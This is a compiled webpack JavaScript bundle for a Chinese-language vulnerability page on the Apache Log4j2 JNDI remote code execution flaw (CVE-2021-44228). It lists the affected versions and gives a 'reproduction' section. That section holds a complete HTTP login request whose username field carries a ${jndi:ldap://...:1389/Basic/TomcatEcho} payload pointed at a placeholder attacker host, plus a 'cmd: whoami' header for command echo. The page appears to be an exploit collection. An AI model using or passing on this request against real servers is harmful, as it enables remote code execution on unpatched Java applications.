(window.webpackJsonp=window.webpackJsonp||[]).push([[607],{2808:function(s,a,t){s.exports=t.p+"assets/img/1639112758169-0e01d095-78c9-475c-94bc-9a05ae161b7f.440015c1.png"},2809:function(s,a,t){s.exports=t.p+"assets/img/1639112868435-e938cac8-d736-466c-acc0-f94fae3ef688.eeb64d5a.png"},3587:function(s,a,t){"use strict";t.r(a);var n=t(68),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"apache-log4j2-jndi-远程命令执行漏洞-cve-2021-44228"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#apache-log4j2-jndi-远程命令执行漏洞-cve-2021-44228"}},[s._v("#")]),s._v(" Apache Log4j2 JNDI 远程命令执行漏洞 CVE-2021-44228")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("Apache Log4j2是一款使用非常广泛的Java日志框架。2021年12月9日，Apache Log4j2爆出存在远程代码执行漏洞，由于Apache Log4j2广泛地应用在各种Web程序中，该漏洞涉及用户量较大，危害性非常之高，漏洞影响版本为2.0~2.14.1。")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("2.0~2.14.1")]),a("br"),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("使用此依赖的JAVA应用")]),a("br"),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("a-checkbox",{attrs:{checked:""}},[s._v("暂无确切语法")]),a("br"),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("参数点发送请求")]),s._v(" "),a("p",[a("img",{attrs:{src:t(2808),alt:"img"}})]),s._v(" "),a("div",{staticClass:"language-go line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-go"}},[a("code",[s._v("POST "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("api"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2.0")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("login HTTP"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\nCookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" JSESSIONID_AV"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("567CEDA964EE4D5DA8B7FC8C90912B01\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Length"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("86")]),s._v("\nSec"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Ch"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Ua"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('" Not A;Brand"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("v"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"99"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Chromium"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("v"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"96"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"Google Chrome"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("v"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"96"')]),s._v("\nAccept"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" application"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("json"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" text"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("javascript"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v('/*; q=0.01\nContent-Type: application/json\nX-Requested-With: XMLHttpRequest\nSec-Ch-Ua-Mobile: ?0\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36\nSec-Ch-Ua-Platform: "macOS"\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\ncmd: whoami\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nConnection: close\n\n{"username":"${jndi:ldap://xxx.xxx.xxx.xxx:1389/Basic/TomcatEcho}","password":"admin"}\n')])])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br")])]),a("p",[a("img",{attrs:{src:t(2809),alt:"img"}})])],1)}),[],!1,null,null,null);a.default=e.exports}}]);